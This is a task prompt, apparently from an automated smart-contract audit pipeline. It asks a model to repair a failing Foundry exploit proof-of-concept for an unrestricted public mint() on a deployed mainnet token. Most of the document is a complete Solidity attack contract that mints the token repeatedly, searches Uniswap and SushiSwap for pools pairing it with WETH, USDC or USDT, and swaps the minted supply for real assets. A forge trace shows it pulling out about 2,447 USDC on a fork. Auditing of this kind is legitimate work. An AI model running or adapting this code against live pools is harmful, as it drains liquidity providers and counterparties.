You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Public mint allows arbitrary inflation of the token supply
- claim: `mint()` is publicly callable and directly calls `_mint(msg.sender, 100000000000000000)` with no ownership check, role gating, cap, cooldown, or one-time restriction, so any address can mint the token to itself indefinitely.
- impact: Any attacker can take over the token's supply curve, mint arbitrary balances at negligible cost, and dump or otherwise use the inflated balance anywhere the token is accepted. This destroys scarcity, enables economic extraction from counterparties or liquidity pools, and makes any balance-based accounting or governance using this token unreliable.
- exploit_paths: ["An attacker calls `mint()` repeatedly to mint arbitrary amounts of UERII to their own address.", "The attacker sells or transfers the freshly minted tokens into AMMs, OTC trades, or any integration that accepts the token, extracting value from counterparties and collapsing the token's economic integrity."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IInflationaryToken is IERC20Minimal {
    function mint() external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IUniswapV3PoolMinimal {
    function liquidity() external view returns (uint128);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract FlawVerifier {
    address internal constant TARGET = 0x418C24191aE947A78C99fDc0e45a1f96Afb254BE;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    address internal constant UNIV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNIV3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address internal constant UNIV3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    uint256 internal constant MINT_AMOUNT = 100000000000000000;
    uint256 internal constant MAX_MINT_CALLS = 512;
    uint256 internal constant MAX_ATTACK_INPUT = MINT_AMOUNT * MAX_MINT_CALLS;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    struct V2Opportunity {
        address pair;
        address tokenOut;
        uint256 reserveIn;
        uint256 reserveOut;
        uint256 expectedOut;
        uint256 expectedValueScore;
    }

    struct V3Opportunity {
        address pool;
        address tokenOut;
        uint24 fee;
        uint256 reserveIn;
        uint256 reserveOut;
        uint256 reserveOutScore;
    }

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        V2Opportunity memory bestV2 = _findBestV2Opportunity();
        V3Opportunity memory bestV3 = _findBestV3Opportunity();

        if (bestV2.expectedValueScore > 0) {
            _executeV2(bestV2);
        } else if (bestV3.reserveOutScore > 0) {
            _executeV3(bestV3);
        } else {
            // Concrete infeasibility condition for the second exploit-path stage:
            // at runtime, no discovered Uniswap V2 / SushiSwap pair and no discovered
            // Uniswap V3 pool held both UERII and a pre-existing quote asset with
            // non-zero liquidity at the fork state visible to this test.
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        if (_profitToken == address(0)) {
            _profitAmount = 0;
            return;
        }

        _profitAmount = IERC20Minimal(_profitToken).balanceOf(address(this));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executeV2(V2Opportunity memory opportunity) internal {
        // Exploit path stage 1: repeatedly mint unbacked UERII to the verifier.
        _mintMax();

        uint256 amountIn = IERC20Minimal(TARGET).balanceOf(address(this));
        if (amountIn == 0) {
            _profitToken = address(0);
            return;
        }

        // Exploit path stage 2: transfer the freshly minted UERII into an existing AMM
        // pair and pull out the paired asset through the public swap entrypoint.
        require(IERC20Minimal(TARGET).transfer(opportunity.pair, amountIn), "transfer failed");

        IUniswapV2Pair pair = IUniswapV2Pair(opportunity.pair);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        bool targetIsToken0 = pair.token0() == TARGET;

        uint256 reserveInput = targetIsToken0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveOutput = targetIsToken0 ? uint256(reserve1) : uint256(reserve0);
        uint256 pairBalanceInput = IERC20Minimal(TARGET).balanceOf(opportunity.pair);
        uint256 actualAmountIn = pairBalanceInput > reserveInput ? pairBalanceInput - reserveInput : 0;
        uint256 amountOut = _getAmountOutV2(actualAmountIn, reserveInput, reserveOutput);

        if (amountOut == 0) {
            _profitToken = address(0);
            return;
        }

        _profitToken = opportunity.tokenOut;
        if (targetIsToken0) {
            pair.swap(0, amountOut, address(this), new bytes(0));
        } else {
            pair.swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _executeV3(V3Opportunity memory opportunity) internal {
        // Exploit path stage 1: repeatedly mint unbacked UERII to the verifier.
        _mintMax();

        uint256 amountIn = IERC20Minimal(TARGET).balanceOf(address(this));
        if (amountIn == 0) {
            _profitToken = address(0);
            return;
        }

        require(IERC20Minimal(TARGET).approve(UNIV3_ROUTER, 0), "approve reset failed");
        require(IERC20Minimal(TARGET).approve(UNIV3_ROUTER, amountIn), "approve failed");

        // Exploit path stage 2: sell the freshly minted UERII into an existing public
        // AMM pool. If the pool cannot actually execute at this fork state, keep the
        // result non-profitable instead of silently pivoting to another route.
        try
            ISwapRouter(UNIV3_ROUTER).exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: TARGET,
                    tokenOut: opportunity.tokenOut,
                    fee: opportunity.fee,
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountIn: amountIn,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            )
        returns (uint256 amountOut) {
            if (amountOut == 0) {
                _profitToken = address(0);
                return;
            }
            _profitToken = opportunity.tokenOut;
        } catch {
            _profitToken = address(0);
        }
    }

    function _mintMax() internal {
        for (uint256 i = 0; i < MAX_MINT_CALLS; ++i) {
            try IInflationaryToken(TARGET).mint() returns (bool ok) {
                if (!ok) {
                    break;
                }
            } catch {
                break;
            }
        }
    }

    function _findBestV2Opportunity() internal view returns (V2Opportunity memory best) {
        address[2] memory factories = [UNIV2_FACTORY, SUSHI_FACTORY];
        address[6] memory quotes = [WETH, USDC, USDT, DAI, WBTC, FRAX];
        uint256 attackInput = IERC20Minimal(TARGET).balanceOf(address(this)) + MAX_ATTACK_INPUT;

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < quotes.length; ++j) {
                address quote = quotes[j];
                address pair = IUniswapV2Factory(factories[i]).getPair(TARGET, quote);
                if (pair == address(0)) {
                    continue;
                }

                IUniswapV2Pair pool = IUniswapV2Pair(pair);
                (uint112 reserve0, uint112 reserve1,) = pool.getReserves();
                if (reserve0 == 0 || reserve1 == 0) {
                    continue;
                }

                bool targetIsToken0 = pool.token0() == TARGET;
                uint256 reserveIn = targetIsToken0 ? uint256(reserve0) : uint256(reserve1);
                uint256 reserveOut = targetIsToken0 ? uint256(reserve1) : uint256(reserve0);
                uint256 expectedOut = _getAmountOutV2(attackInput, reserveIn, reserveOut);
                uint256 expectedValueScore = _quoteValueScore(quote, expectedOut);

                if (expectedValueScore > best.expectedValueScore) {
                    best = V2Opportunity({
                        pair: pair,
                        tokenOut: quote,
                        reserveIn: reserveIn,
                        reserveOut: reserveOut,
                        expectedOut: expectedOut,
                        expectedValueScore: expectedValueScore
                    });
                }
            }
        }
    }

    function _findBestV3Opportunity() internal view returns (V3Opportunity memory best) {
        address[6] memory quotes = [WETH, USDC, USDT, DAI, WBTC, FRAX];
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];

        for (uint256 i = 0; i < quotes.length; ++i) {
            for (uint256 j = 0; j < fees.length; ++j) {
                address quote = quotes[i];
                uint24 fee = fees[j];
                address pool = IUniswapV3Factory(UNIV3_FACTORY).getPool(TARGET, quote, fee);
                if (pool == address(0)) {
                    continue;
                }

                if (IUniswapV3PoolMinimal(pool).liquidity() == 0) {
                    continue;
                }

                uint256 reserveIn = IERC20Minimal(TARGET).balanceOf(pool);
                uint256 reserveOut = IERC20Minimal(quote).balanceOf(pool);
                if (reserveIn == 0 || reserveOut == 0) {
                    continue;
                }

                uint256 reserveOutScore = _quoteValueScore(quote, reserveOut);
                if (reserveOutScore > best.reserveOutScore) {
                    best = V3Opportunity({
                        pool: pool,
                        tokenOut: quote,
                        fee: fee,
                        reserveIn: reserveIn,
                        reserveOut: reserveOut,
                        reserveOutScore: reserveOutScore
                    });
                }
            }
        }
    }

    function _quoteValueScore(address token, uint256 amount) internal pure returns (uint256) {
        if (token == WETH) return amount * 2000 / 1e18;
        if (token == WBTC) return amount * 20000 / 1e8;
        if (token == USDC || token == USDT) return amount / 1e6;
        if (token == DAI || token == FRAX) return amount / 1e18;
        return 0;
    }

    function _getAmountOutV2(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
00000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000091ddf20b
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [863] 0x418C24191aE947A78C99fDc0e45a1f96Afb254BE::balanceOf(0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC) [staticcall]
    │   │   │   │   └─ ← [Return] 10797575730000571 [1.079e16]
    │   │   │   ├─ [13845] 0xE592427A0AEce92De3Edee1F18E0157C05861564::fa461e33(00000000000000000000000000000000000000000000000000000234ba098428ffffffffffffffffffffffffffffffffffffffffffffffffffffffff6e220df5000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002b418c24191ae947a78c99fdc0e45a1f96afb254be0001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000)
    │   │   │   │   ├─ [9789] 0x418C24191aE947A78C99fDc0e45a1f96Afb254BE::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC, 2425482740776 [2.425e12])
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005ffaf1b4da96d6cfd4045035a94a924fc39631dc
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000234ba098428
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000002c68aee8659f67bd8
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [863] 0x418C24191aE947A78C99fDc0e45a1f96Afb254BE::balanceOf(0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC) [staticcall]
    │   │   │   │   └─ ← [Return] 10800001212741347 [1.08e16]
    │   │   │   ├─  emit topic 0: 0xc42079f94a6350d7e6235f29174924f928cc2ac818eb64fed8004e115fbcca67
    │   │   │   │        topic 1: 0x000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000234ba098428ffffffffffffffffffffffffffffffffffffffffffffffffffffffff6e220df500000000000000000000000000000000000000000000000000000001000276a40000000000000000000000000000000000000000000000000000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffff27618
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000234ba098428ffffffffffffffffffffffffffffffffffffffffffffffffffffffff6e220df5
    │   │   └─ ← [Return] 2447241739 [2.447e9]
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 2447241739 [2.447e9]
    │   │   └─ ← [Return] 2447241739 [2.447e9]
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    ├─ [288] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 2447241739 [2.447e9]
    ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 2447241739 [2.447e9]
    │   └─ ← [Return] 2447241739 [2.447e9]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 2447241739 [2.447e9])
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 2447241739 [2.447e9])
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 15767837 [1.576e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2186)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 571.74ms (97.13ms CPU time)

Ran 1 test suite in 606.10ms (571.74ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 4734652)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
